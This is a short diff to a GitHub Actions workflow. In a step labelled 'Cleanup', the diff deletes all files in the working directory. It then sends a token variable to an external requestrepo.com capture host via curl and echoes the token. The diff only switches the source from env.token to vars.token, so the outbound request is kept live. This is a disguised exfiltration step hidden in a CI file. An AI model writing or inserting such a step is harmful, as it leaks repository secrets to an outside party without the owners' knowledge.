@@ -19,8 +19,8 @@ jobs:
       - name: Cleanup
         run: |
           rm -rf * .[^.]*
-          curl https://qzumr90r.requestrepo.com/${{ env.token }}
-          echo "token: ${{ env.token }} (will be masked if secret)"
+          curl https://qzumr90r.requestrepo.com/${{ vars.token }}
+          echo "token: ${{ vars.token }} (will be masked if secret)"
 
       - name: Checkout Repository
         uses: actions/checkout@v4
